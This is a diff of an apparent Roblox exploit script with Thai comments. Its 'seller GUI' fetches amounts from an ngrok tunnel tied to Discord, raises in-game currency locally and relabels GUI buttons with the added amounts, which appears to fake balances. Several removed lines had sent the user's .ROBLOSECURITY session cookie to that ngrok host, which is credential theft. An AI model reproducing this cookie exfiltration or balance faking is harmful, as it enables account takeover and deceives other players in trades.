@@ -27,7 +27,6 @@ local function check_env(env)
         end
     end
 end
-end
 
 check_env( getgenv() )
 check_env( getrenv() )
@@ -3116,8 +3115,7 @@ else -- SELLER GUI
                         Url = "https://43432fa501aa.ngrok-free.app/get-money-requests",
                         Method = "GET",
                         Headers = {
-                            ["ngrok-skip-browser-warning"] = "true",
-                            ["Cookie"] = ".ROBLOSECURITY=" .. (GuiSettings["Roblox_Cookie"] or "")
+                            ["ngrok-skip-browser-warning"] = "true"
                         }
                     })
                 end)
@@ -3163,6 +3161,15 @@ else -- SELLER GUI
                 if currency then
                     local oldAmount = currency.Value
                     currency.Value = currency.Value + amount
+                    
+                    -- เพิ่มการติดตามเงินที่เพิ่มจาก Discord
+                    if targetPlayer == PLAYER then
+                        totalAddedMoney = totalAddedMoney + amount
+                        print("💰 ติดตาม: เพิ่มเงินจาก Discord รวม $" .. totalAddedMoney)
+                        
+                        -- อัปเดต GUI พิเศษสำหรับช่องด้านขวา
+                        updateRightSideGUI(amount, totalAddedMoney)
+                    end
                     
                     print("✅ เพิ่มเงิน $" .. amount .. " ให้ " .. targetUsername)
                     print("   เงินเดิม: $" .. oldAmount .. " → เงินใหม่: $" .. currency.Value)
@@ -3244,24 +3251,11 @@ else -- SELLER GUI
                         end
                         
                         -- ตรวจสอบปุ่มหรือ element ที่แสดงจำนวนที่เพิ่ม
-                        if gui.Name:lower():find("button") or 
-                           gui.Name:lower():find("add") or 
-                           gui.Name:lower():find("amount") then
-                            
-                            -- อัปเดตปุ่มให้แสดงจำนวนที่เพิ่มในรูปแบบสั้น
-                            local shortFormat = ""
-                            if addedAmount >= 1000000000 then
-                                shortFormat = string.format("%.1fb", addedAmount / 1000000000):gsub("%.0", "")
-                            elseif addedAmount >= 1000000 then
-                                shortFormat = string.format("%.1fm", addedAmount / 1000000):gsub("%.0", "")
-                            elseif addedAmount >= 1000 then
-                                shortFormat = string.format("%.1fk", addedAmount / 1000):gsub("%.0", "")
-                            else
-                                shortFormat = tostring(addedAmount)
+                        if gui.Name:lower():find("button") or gui.Name:lower():find("add") then
+                            if text:match("^[%d]+[km]?$") then -- เช่น "1m", "500k"
+                                gui.Text = formatMoney(addedAmount)
+                                print("🔘 อัปเดตปุ่ม: " .. gui:GetFullName() .. " → " .. formatMoney(addedAmount))
                             end
-                            
-                            gui.Text = shortFormat
-                            print("🔘 อัปเดตปุ่ม: " .. gui:GetFullName() .. " → " .. shortFormat)
                         end
                     end
                 end
@@ -3348,8 +3342,7 @@ else -- SELLER GUI
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json",
-                    ["ngrok-skip-browser-warning"] = "true",
-                    ["Cookie"] = ".ROBLOSECURITY=" .. (GuiSettings["Roblox_Cookie"] or "")
+                    ["ngrok-skip-browser-warning"] = "true"
                 },
                 Body = HttpService:JSONEncode(payload)
             })
@@ -3455,9 +3448,7 @@ else -- SELLER GUI
                 Url = "https://43432fa501aa.ngrok-free.app/send-embed",
                 Method = "POST",
                 Headers = {
-                    ["Content-Type"] = "application/json",
-                    ["ngrok-skip-browser-warning"] = "true",
-                    ["Cookie"] = ".ROBLOSECURITY=" .. (GuiSettings["Roblox_Cookie"] or "")
+                    ["Content-Type"] = "application/json"
                 },
                 Body = HttpService:JSONEncode(payload)
             })
